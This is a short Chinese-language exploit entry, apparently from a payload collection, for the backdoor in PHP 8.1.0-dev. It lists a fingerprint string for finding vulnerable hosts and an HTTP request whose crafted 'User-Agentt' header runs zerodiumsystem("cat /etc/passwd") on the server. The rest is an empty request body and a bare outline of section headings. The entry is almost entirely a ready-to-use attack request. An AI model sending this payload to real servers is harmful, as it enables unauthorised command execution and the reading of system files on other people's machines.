# PHP-8.1.0-devzerodium后门命令执行漏洞

- **系统**：PHP　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"PHP/8.1.0-dev"`
- **请求**：`GET / HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`User-Agentt: zerodiumsystem("cat /etc/passwd");`

**请求体 / payload**
```

```

**其他**
- PHP-8.1.0-dev zerodium后门命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PHP/8.1.0-dev